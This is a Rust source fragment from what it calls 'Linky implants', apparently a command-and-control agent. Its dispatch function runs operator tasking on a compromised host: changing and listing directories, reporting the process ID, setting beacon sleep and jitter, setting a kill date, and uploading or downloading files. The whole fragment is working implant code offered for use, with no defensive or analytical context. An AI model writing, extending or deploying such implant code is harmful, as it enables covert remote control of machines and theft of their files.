/// Cross-platform command dispatch for Linky implants.
///
/// Returns `Some(output)` if the command was handled here,
/// `None` if the caller's platform-specific code should handle it.
pub fn dispatch_common(command: &str, parameters: &str) -> Option<String> {
    let output = match command {
        "cd" => {
            let path = crate::extract_param(parameters, "path");
            std::env::set_current_dir(&path)
                .map(|_| String::new())
                .unwrap_or_else(|e| format!("[-] {}", e))
        }
        "pwd" => std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e)),
        "ls" => {
            let path = crate::extract_param(parameters, "path");
            crate::list_dir(if path.is_empty() { "." } else { &path })
        }
        "pid" => std::process::id().to_string(),
        "sleep" => {
            let secs = crate::extract_param(parameters, "seconds");
            let jitter = crate::extract_param(parameters, "jitter");
            crate::handle_sleep_command(format!("{} {}", secs, jitter).trim())
        }
        "killdate" => {
            crate::handle_killdate_command(&crate::extract_param(parameters, "date"))
        }
        "download" => crate::download_file(&crate::extract_param(parameters, "path")),
        "upload" => crate::upload_file(&crate::extract_param(parameters, "path")),
        _ => return None,
    };
    Some(output)
}
